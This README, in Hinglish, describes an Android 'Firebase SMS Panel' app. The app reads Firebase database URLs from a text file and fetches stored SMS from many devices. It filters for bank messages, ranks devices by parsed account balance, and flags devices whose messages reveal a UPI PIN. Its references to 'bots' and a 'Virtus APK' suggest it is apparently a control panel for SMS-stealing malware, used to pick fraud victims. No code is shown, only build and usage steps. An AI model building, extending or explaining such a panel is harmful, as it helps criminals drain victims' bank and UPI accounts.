# Firebase SMS Panel (standalone APK)

Alag Android app — repo ke bots / Virtus APK se **alag**. TXT me Firebase RTDB URLs daalo → parallel fetch → bank SMS filter → device list (tap = detail).

## Build

1. Android Studio (latest) install karo.
2. **Open** → folder `firebase-sms-panel-app` select karo.
3. Gradle sync → **Run** on device/emulator.

Pehli baar Android Studio `gradlew` generate kar sakta hai.

## Use

1. App khol ke **TXT se Firebase URLs** dabao — `.txt` pick karo (har line / mix URLs).
2. Chips: **High→Low (50K–90L)** / **Low→High (2K–50K)** · **With / Without / Both PIN (device)** · **Online / Offline / Both** · **days / All**.
3. Device row tap → Firebase URL + device id + filtered SMS.

## Notes

- Filters **bank-like** SMS pe (spam/loan promo skip). Amount SMS se parse (avl/balance/credited…).
- **PIN** = device par koi bhi SMS me UPI PIN pattern mila to “with PIN device”.
- Internet permission required; Firebase public read hona chahiye.
